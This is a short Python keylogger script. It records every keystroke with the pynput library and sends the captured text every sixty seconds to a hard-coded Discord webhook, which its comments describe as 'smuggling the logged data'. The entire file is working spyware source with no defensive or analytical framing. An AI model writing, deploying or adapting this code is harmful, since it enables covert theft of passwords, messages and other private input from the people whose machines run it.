# Importing Required Libraries
import requests
from pynput.keyboard import Key, Listener
import time

# don't mind this variable!
data = "" 

# Replace with your discord webhook URL here [string:url]
webhook = "https://discord.com/api/webhooks/908351587653652480/FvLcQlA5gOGcNBxp2r-F-gsh6KvKH_2RGSnUGdJhymTyQNRtKIbt6geR6ER7lB0awZ3L"

# Interval for smuggling the logged data [int:seconds]
smuggleInterval = 60 


def formatKeys(key):

    # This create problem with Discord Formatting
    if "`" in key:
        return " `backtick` " 

    if "Key." in key:
        newKey = "  ` " + key.split(".")[1].replace("_", " ").upper() + " `  "
        return newKey
    else:

        if key[-1] == ">" and key[0] == "<" or "\\x" in key:
            return " `" + key + "` "

        return key.replace("'", "")

def discordLog(key):
    if key == "":
        return
    keyData = {"content": key}
    response = requests.post(webhook, json=keyData)
    data = ""

def on_press(key):
    
    global data

    key = str(key)
    data = data + formatKeys(key)


with Listener(on_press=on_press) as listener:
    while True:
        discordLog(data)
        time.sleep(smuggleInterval)
        
    global listner
    listener.join()
